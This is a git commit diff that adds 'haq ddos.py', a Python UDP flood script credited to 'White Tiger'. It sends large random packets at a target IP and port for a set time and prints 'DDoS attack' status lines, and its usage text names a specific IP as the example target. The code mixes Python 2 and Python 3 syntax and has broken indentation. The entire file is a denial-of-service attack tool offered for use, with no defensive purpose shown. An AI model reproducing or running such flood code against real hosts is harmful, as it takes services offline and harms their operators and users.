8f7a5eda56166c68bd2d243c7157c16c3ccfa28f
km2262488 <km2262488@gmail.com>
2025-09-17 09:40:38 +0800

    Update haq ddos.py

--- haq ddos.py
+++ haq ddos.py
@@ -1,1 +1,45 @@
 
+import time
+import socket
+import random
+import sys
+import os
+
+os.system("git pull")
+os.system("figlet haq-ddos")
+print "Tool Created By White Tiger"
+print "starting in 9 seconds....."
+time.sleep(5)
+
+os.system("clear")
+os.system("figlet Attack Starting")
+time.sleep(3)
+
+def usage():
+	os.system("figlet haq-ddos")
+	print "Tool Created By White Tiger"
+        print "Usage : python3 haq ddos.py 196.220.60.200 80 100"
+
+def flood(victim, vport, duration):
+    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    bytes = random._urandom(20000)
+    timeout =  time.time() + duration
+    sent = 3000
+
+    while 1:
+        if time.time() > timeout:
+            break
+        else:
+            pass
+        client.sendto(bytes, (victim, vport))
+        sent = sent + 1
+        print "\033[1;91mStarting \033[1;32m%s \033[1;91mDDoS attack to \033[1;32m%s \033[1;91mOn port \033[1;32m%s "%(sent, victim, vport)
+def main():
+    print len(sys.argv)
+    if len(sys.argv) != 4:
+        usage()
+    else:
+        flood(sys.argv[1], int(sys.argv[2]), int(sys.argv[3]))
+
+if __name__ == '__main__':
+    main()
